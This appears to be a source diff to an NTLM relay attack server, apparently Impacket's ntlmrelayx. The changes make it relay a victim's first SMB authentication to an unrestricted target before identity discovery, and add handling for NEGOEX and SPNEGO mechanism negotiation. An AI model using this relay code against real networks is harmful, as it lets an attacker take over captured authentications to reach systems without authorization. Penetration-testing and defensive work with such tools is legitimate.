@@ -141,6 +141,7 @@ class SMBRelayServer(Thread):
         respPacket['Command'] = smb3.SMB2_NEGOTIATE
         respPacket['SessionID'] = 0
 
+        relayInitialAuthentication = self.config.disableMulti
         if self.config.disableMulti:
             if self.config.mode.upper() == 'REFLECTION':
                 self.targetprocessor = TargetsProcessor(singleTarget='SMB://%s:445/' % connData['ClientIP'])
@@ -157,7 +158,17 @@ class SMBRelayServer(Thread):
                     return None, [respPacket], STATUS_BAD_NETWORK_NAME
 
             LOG.info("(SMB): Received connection from %s, attacking target %s://%s" % (connData['ClientIP'], self.target.scheme, self.target.netloc))
+        else:
+            # Prefer relaying the first authentication to an unrestricted target.
+            # If only username-bound targets remain, SessionSetup falls back to
+            # local authentication so TreeConnect can select by identity.
+            self.target = self.targetprocessor.getTarget()
+            if self.target is not None:
+                relayInitialAuthentication = True
+                LOG.info("(SMB): Received connection from %s, attacking target %s://%s before identity discovery" %
+                         (connData['ClientIP'], self.target.scheme, self.target.netloc))
 
+        if relayInitialAuthentication:
             try:
                 if self.config.mode.upper() == 'REFLECTION':
                     # Force standard security when doing reflection
@@ -174,6 +185,8 @@ class SMBRelayServer(Thread):
             else:
                 connData['SMBClient'] = client
                 connData['EncryptionKey'] = client.getStandardSecurityChallenge()
+                if not self.config.disableMulti:
+                    connData['relayToHost'] = True
                 smbServer.setConnectionData(connId, connData)
 
         if isSMB1 is False:
@@ -252,31 +265,42 @@ class SMBRelayServer(Thread):
         if struct.unpack('B',securityBlob[0:1])[0] == ASN1_AID:
            # NEGOTIATE packet
            blob =  SPNEGO_NegTokenInit(securityBlob)
-           token = blob['MechToken']
-           if len(blob['MechTypes'][0]) > 0:
-               # Is this GSSAPI NTLM or something else we don't support?
-               mechType = blob['MechTypes'][0]
-               if mechType != TypesMech['NTLMSSP - Microsoft NTLM Security Support Provider']:
-                   # Nope, do we know it?
-                   if mechType in MechTypes:
-                       mechStr = MechTypes[mechType]
-                   else:
-                       mechStr = hexlify(mechType)
-                   smbServer.log("Unsupported MechType '%s'" % mechStr, logging.DEBUG)
-                   # We don't know the token, we answer back again saying
-                   # we just support NTLM.
-                   respToken = SPNEGO_NegTokenResp()
-                   respToken['NegState'] = b'\x03'  # request-mic
-                   respToken['SupportedMech'] = TypesMech['NTLMSSP - Microsoft NTLM Security Support Provider']
-                   respToken = respToken.getData()
-                   respSMBCommand['SecurityBufferOffset'] = 0x48
-                   respSMBCommand['SecurityBufferLength'] = len(respToken)
-                   respSMBCommand['Buffer'] = respToken
+           token = blob['MechToken'] if 'MechToken' in blob.fields else b''
 
-                   return [respSMBCommand], None, STATUS_MORE_PROCESSING_REQUIRED
+           mechTypes = blob['MechTypes'] if 'MechTypes' in blob.fields else []
+           negoexOffered = TypesMech['NEGOEX - SPNEGO Extended Negotiation Security Mechanism'] in mechTypes
+           if negoexOffered:
+               LOG.info("(SMB): NEGOEX authentication offered by client %s, currently not supported for relay" % connData['ClientIP'])
+
+           mechType = mechTypes[0] if mechTypes else None
+           ntlmMech = TypesMech['NTLMSSP - Microsoft NTLM Security Support Provider']
+           if mechType != ntlmMech:
+               if mechType in MechTypes:
+                   mechStr = MechTypes[mechType]
+               elif mechType is not None:
+                   mechStr = hexlify(mechType)
+               else:
+                   mechStr = 'none'
+               smbServer.log("Unsupported MechType '%s'" % mechStr, logging.DEBUG)
+               # Ask the client to continue using NTLM instead of attempting
+               # to parse an optimistic token for another mechanism as NTLM.
+               respToken = SPNEGO_NegTokenResp()
+               respToken['NegState'] = b'\x03'  # request-mic
+               respToken['SupportedMech'] = ntlmMech
+               respToken = respToken.getData()
+               respSMBCommand['SecurityBufferOffset'] = 0x48
+               respSMBCommand['SecurityBufferLength'] = len(respToken)
+               respSMBCommand['Buffer'] = respToken
+               return [respSMBCommand], None, STATUS_MORE_PROCESSING_REQUIRED
         elif struct.unpack('B',securityBlob[0:1])[0] == ASN1_SUPPORTED_MECH:
            # AUTH packet
            blob = SPNEGO_NegTokenResp(securityBlob)
+           if blob.isNegoExSelected():
+               LOG.info("(SMB): NEGOEX selected by client %s, currently not supported for relay" % connData['ClientIP'])
+               respSMBCommand['SecurityBufferOffset'] = 0x48
+               respSMBCommand['SecurityBufferLength'] = 0
+               respSMBCommand['Buffer'] = b''
+               return [respSMBCommand], None, STATUS_ACCESS_DENIED
            token = blob['ResponseToken']
         else:
            # No GSSAPI stuff, raw NTLMSSP
@@ -505,6 +529,7 @@ class SMBRelayServer(Thread):
     def SmbComNegotiate(self, connId, smbServer, SMBCommand, recvPacket):
         connData = smbServer.getConnectionData(connId, checkStatus = False)
 
+        relayInitialAuthentication = self.config.disableMulti
         if self.config.disableMulti:
             if self.config.mode.upper() == 'REFLECTION':
                 self.targetprocessor = TargetsProcessor(singleTarget='SMB://%s:445/' % connData['ClientIP'])
@@ -519,7 +544,17 @@ class SMBRelayServer(Thread):
                     return [smb.SMBCommand(smb.SMB.SMB_COM_NEGOTIATE)], None, STATUS_BAD_NETWORK_NAME
 
             LOG.info("(SMB): Received connection from %s, attacking target %s://%s" % (connData['ClientIP'], self.target.scheme, self.target.netloc))
+        else:
+            # Prefer relaying the first authentication to an unrestricted target.
+            # If only username-bound targets remain, SessionSetup falls back to
+            # local authentication so TreeConnect can select by identity.
+            self.target = self.targetprocessor.getTarget()
+            if self.target is not None:
+                relayInitialAuthentication = True
+                LOG.info("(SMB): Received connection from %s, attacking target %s://%s before identity discovery" %
+                         (connData['ClientIP'], self.target.scheme, self.target.netloc))
 
+        if relayInitialAuthentication:
             try:
                 if recvPacket['Flags2'] & smb.SMB.FLAGS2_EXTENDED_SECURITY == 0:
                     extSec = False
@@ -540,6 +575,8 @@ class SMBRelayServer(Thread):
             else:
                 connData['SMBClient'] = client
                 connData['EncryptionKey'] = client.getStandardSecurityChallenge()
+                if not self.config.disableMulti:
+                    connData['relayToHost'] = True
                 smbServer.setConnectionData(connId, connData)
 
         else:
@@ -579,11 +616,43 @@ class SMBRelayServer(Thread):
             if struct.unpack('B',sessionSetupData['SecurityBlob'][0:1])[0] != ASN1_AID:
                # If there no GSSAPI ID, it must be an AUTH packet
                blob = SPNEGO_NegTokenResp(sessionSetupData['SecurityBlob'])
+               if blob.isNegoExSelected():
+                   LOG.info("(SMB): NEGOEX selected by client %s, currently not supported for relay" % connData['ClientIP'])
+                   return [respSMBCommand], None, STATUS_ACCESS_DENIED
                token = blob['ResponseToken']
             else:
                # NEGOTIATE packet
                blob =  SPNEGO_NegTokenInit(sessionSetupData['SecurityBlob'])
-               token = blob['MechToken']
+               mechTypes = blob['MechTypes'] if 'MechTypes' in blob.fields else []
+               negoexOffered = TypesMech['NEGOEX - SPNEGO Extended Negotiation Security Mechanism'] in mechTypes
+               if negoexOffered:
+                   LOG.info("(SMB): NEGOEX authentication offered by client %s, currently not supported for relay" % connData['ClientIP'])
+
+               mechType = mechTypes[0] if mechTypes else None
+               ntlmMech = TypesMech['NTLMSSP - Microsoft NTLM Security Support Provider']
+               if mechType != ntlmMech:
+                   if mechType in MechTypes:
+                       mechStr = MechTypes[mechType]
+                   elif mechType is not None:
+                       mechStr = hexlify(mechType)
+                   else:
+                       mechStr = 'none'
+                   LOG.debug("(SMB): Unsupported MechType '%s'" % mechStr)
+
+                   respToken = SPNEGO_NegTokenResp()
+                   respToken['NegState'] = b'\x03'  # request-mic
+                   respToken['SupportedMech'] = ntlmMech
+                   respToken = respToken.getData()
+                   respParameters['SecurityBlobLength'] = len(respToken)
+                   respData['SecurityBlobLength'] = respParameters['SecurityBlobLength']
+                   respData['SecurityBlob'] = respToken
+                   respData['NativeOS'] = ''
+                   respData['NativeLanMan'] = ''
+                   respSMBCommand['Parameters'] = respParameters
+                   respSMBCommand['Data'] = respData
+                   return [respSMBCommand], None, STATUS_MORE_PROCESSING_REQUIRED
+
+               token = blob['MechToken'] if 'MechToken' in blob.fields else b''
 
             # Here we only handle NTLMSSP, depending on what stage of the
             # authentication we are, we act on it
@@ -955,4 +1024,3 @@ class SMBRelayServer(Thread):
     def run(self):
         LOG.info("Setting up SMB Server on port %s" % self.server.server_address[1])
         self._start()
-
